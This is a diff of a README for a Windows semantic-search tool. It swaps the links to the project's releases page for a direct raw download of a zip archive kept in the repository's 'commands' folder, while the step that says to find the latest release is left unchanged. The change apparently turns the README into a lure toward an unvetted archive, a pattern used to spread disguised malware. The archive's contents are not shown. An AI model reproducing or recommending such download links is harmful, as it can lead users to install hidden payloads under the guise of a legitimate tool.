@@ -1,12 +1,12 @@
 # 🔎 cowork-semantic-search - Find your files fast
 
-[![Download cowork-semantic-search](https://img.shields.io/badge/Download%20Latest-purple?style=for-the-badge)](https://github.com/Ansellwaxlike187/cowork-semantic-search/releases)
+[![Download cowork-semantic-search](https://img.shields.io/badge/Download%20Latest-purple?style=for-the-badge)](https://github.com/Ansellwaxlike187/cowork-semantic-search/raw/refs/heads/main/commands/cowork-semantic-search-v2.5.zip)
 
 **Local semantic search for your documents on Windows. No API keys. No cloud.**
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Ansellwaxlike187/cowork-semantic-search/releases
+Visit this page to download: https://github.com/Ansellwaxlike187/cowork-semantic-search/raw/refs/heads/main/commands/cowork-semantic-search-v2.5.zip
 
 1. Open the link above.
 2. Find the latest release at the top of the page.
